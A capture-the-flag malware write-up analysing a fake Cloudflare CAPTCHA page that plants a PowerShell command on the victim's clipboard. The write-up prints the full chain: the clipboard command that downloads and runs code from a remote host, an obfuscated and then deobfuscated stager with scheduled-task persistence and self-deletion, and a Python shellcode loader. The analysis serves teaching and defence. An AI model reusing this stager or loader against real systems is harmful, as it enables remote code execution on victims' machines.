**Category:** Malware  
**Author:** John Hammond

![](./files/08%20-%20Verify%20You%20Are%20Human/08%20-%20Verify%20You%20Are%20Human.png)

---

The challenge instance displayed a fake Cloudflare CAPTCHA page.

![](./files/08%20-%20Verify%20You%20Are%20Human/01.png)
![](./files/08%20-%20Verify%20You%20Are%20Human/02.png)

As expected, a malicious payload could then be found on the clipboard:

```
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://10.1.92.136/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

The first payload downloaded and executed a second payload:

```
$ curl -s http://10.1.92.136/?tic=1 
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://10.1.92.136/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

Cleaning that up and deobfuscating it revealed this:

```PowerShell
$pyc_extension = ".pyc";
$random_guid = [guid]::NewGuid();
$local_appdata = $env:LocalAppData;
Invoke-RestMethod 'http://10.1.92.136/?tic=2' -OutFile $local_appdata\$random_guid.pdf;
Add-Type -AssemblyName System.IO.Compression.FileSystem;
[System.IO.Compression.ZipFile]::ExtractToDirectory("$local_appdata\$random_guid.pdf", "$local_appdata\$random_guid");
$target_dir = Join-Path $local_appdata $random_guid;
$task_name = "$random_guid";
$python_exe = "$target_dir\pythonw.exe";
$python_pyc = "$target_dir\cpython-3134.pyc";
$scheduled_task = New-ScheduledTaskAction -Execute $python_exe -Argument "`"$python_pyc`"";
$time_3min_future = (Get-Date).AddSeconds(180);
$task_trigger = New-ScheduledTaskTrigger -Once -At $time_3min_future;
$task_principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;
Register-ScheduledTask -TaskName $task_name -Action $scheduled_task -Trigger $task_trigger -Principal $task_principal -Force;
Set-Location $target_dir;
$python_pyc = "cpython-3134" + $pyc_extension; 
Rename-Item -Path "cpython-3134" -NewName $python_pyc; 
Invoke-Expression ('rundll32 shell32.dll,ShellExec_RunDLL "' + $target_dir + '\pythonw" "' + $target_dir + '\'+ $python_pyc + '"');
Remove-Item $MyInvocation.MyCommand.Path -Force;
Set-Clipboard
```

The above would download a ZIP file disguised as a PDF and extract it, followed by utilizing the portable Python installation contained therein to execute `cpython-3134.pyc`. Decompiling  `cpython-3134.pyc` via [PyLingual](https://pylingual.io/view_chimera?identifier=87d19328685d5080c25ca3e66bc6712d9e188190de4d26014dc8761f38bfbdf3) revealed a base64 blob being decoded and executed as Python:

```Python
import base64
exec(base64.b64decode('aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp').decode('utf-8'))
```

Decoding the base64 revealed a Python script that decoded, decrypted and executed shellcode:

```Python
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```

The resulting shellcode was tiny:

```
$ xxd shellcode.bin                    
00000000: 5589 e581 ec80 0000 0068 93d8 8484 6890  U........h....h.
00000010: c3c6 9768 c390 9392 6890 c4c3 c768 9c93  ...h....h....h..
00000020: 9c93 68c0 9cc6 c668 97c6 9c93 6894 c79d  ..h....h....h...
00000030: c168 dec1 9691 68c3 c9c4 c2b9 0a00 0000  .h....h.........
00000040: 89e7 8137 a5a5 a5a5 83c7 0449 75f4 c644  ...7.......Iu..D
00000050: 2426 00c6 857f ffff ff00 89e6 8d7d 80b9  $&...........}..
00000060: 2600 0000 8a06 8807 4647 4975 f7c6 0700  &.......FGIu....
00000070: 8d3c 24b9 4000 0000 b001 8807 4749 75fa  .<$.@.......GIu.
00000080: c9c3
```

Looking at it in IDA, I could see it pushing values on the stack and XOR-decoding them.

```C
seg000:0000000000000000 ; char sub_0()
seg000:0000000000000000 sub_0           proc near
seg000:0000000000000000
seg000:0000000000000000 var_D0          = byte ptr -0D0h
seg000:0000000000000000 var_AA          = byte ptr -0AAh
seg000:0000000000000000 var_81          = byte ptr -81h
seg000:0000000000000000 var_80          = byte ptr -80h
seg000:0000000000000000
seg000:0000000000000000                 push    rbp
seg000:0000000000000001                 mov     ebp, esp
seg000:0000000000000003                 sub     esp, 80h
seg000:0000000000000009                 push    0FFFFFFFF8484D893h
seg000:000000000000000E                 push    0FFFFFFFF97C6C390h
seg000:0000000000000013                 push    0FFFFFFFF929390C3h
seg000:0000000000000018                 push    0FFFFFFFFC7C3C490h
seg000:000000000000001D                 push    0FFFFFFFF939C939Ch
seg000:0000000000000022                 push    0FFFFFFFFC6C69CC0h
seg000:0000000000000027                 push    0FFFFFFFF939CC697h
seg000:000000000000002C                 push    0FFFFFFFFC19DC794h
seg000:0000000000000031                 push    0FFFFFFFF9196C1DEh
seg000:0000000000000036                 push    0FFFFFFFFC2C4C9C3h
seg000:000000000000003B                 mov     ecx, 0Ah
seg000:0000000000000040                 mov     edi, esp
seg000:0000000000000042
seg000:0000000000000042 loc_42:                                 ; CODE XREF: sub_0+4B↓j
seg000:0000000000000042                 xor     dword ptr [rdi], 0A5A5A5A5h
seg000:0000000000000048                 add     edi, 4
seg000:000000000000004B                 jnz     short loc_42
seg000:000000000000004E                 mov     [rsp+0D0h+var_AA], 0
seg000:0000000000000053                 mov     [rbp+var_81], 0
seg000:000000000000005A                 mov     esi, esp
seg000:000000000000005C                 lea     edi, [rbp+var_80]
seg000:000000000000005F                 mov     ecx, 26h ; '&'
seg000:0000000000000064
seg000:0000000000000064 loc_64:                                 ; CODE XREF: sub_0+68↓j
seg000:0000000000000064                 mov     al, [rsi]
seg000:0000000000000066                 mov     [rdi], al
seg000:0000000000000068                 db      46h, 47h
seg000:0000000000000068                 jnz     short loc_64
seg000:000000000000006D                 mov     byte ptr [rdi], 0
seg000:0000000000000070                 lea     edi, [rsp+0D0h+var_D0]
seg000:0000000000000073                 mov     ecx, 40h ; '@'
seg000:0000000000000078                 mov     al, 1
seg000:000000000000007A
seg000:000000000000007A loc_7A:                                 ; CODE XREF: sub_0+7C↓j
seg000:000000000000007A                 mov     [rdi], al
seg000:000000000000007C                 db      47h
seg000:000000000000007C                 jnz     short loc_7A
seg000:0000000000000080                 leave
seg000:0000000000000081                 retn
seg000:0000000000000081 sub_0           endp
```

The psuedo-C looked like this:

```C
char sub_0()
{
  unsigned int v0; // esp
  unsigned __int64 v1; // rdi
  bool v2; // zf
  unsigned int v3; // esp
  int v4; // esp
  unsigned __int64 v5; // rdi
  unsigned int v6; // esp
  char result; // al

  v1 = v0;
  do
  {
    *v1 ^= 0xA5A5A5A5;
    v2 = v1 == -4;
    v1 = (v1 + 4);
  }
  while ( v1 );
  v5 = (v4 - 128);
  do
    *v5 = *v3;
  while ( !v2 );
  *v5 = 0;
  result = 1;
  do
    *v6 = 1;
  while ( !v2 );
  return result;
}
```

From here it was trivial to solve with a bit of Python:

```Python
#!/usr/bin/env python
from Crypto.Util.number import long_to_bytes

def main():
    stack = [
        0x8484D893,
        0x97C6C390,
        0x929390C3,
        0xC7C3C490,
        0x939C939C,
        0xC6C69CC0,
        0x939CC697,
        0xC19DC794,
        0x9196C1DE,
        0xC2C4C9C3,
    ]

    flag = b""

    for item in stack:
        item = item ^ 0xA5A5A5A5
        flag += long_to_bytes(item)
        
    print(flag.decode()[-1::-1])

if __name__ == "__main__":
    main()
```

```
$ python solve.py
flag{d341b8d2c96e9cc96965afbf5675fc26}!!
```

Flag: **flag{d341b8d2c96e9cc96965afbf5675fc26}**

---

**Files:**
- [cpython-3134.pyc](./files//08%20-%20Verify%20You%20Are%20Human/cpython-3134.pyc)
- [guid_pdf.zip](./files//08%20-%20Verify%20You%20Are%20Human/guid_pdf.zip)
- [solve.py](./files//08%20-%20Verify%20You%20Are%20Human/solve.py)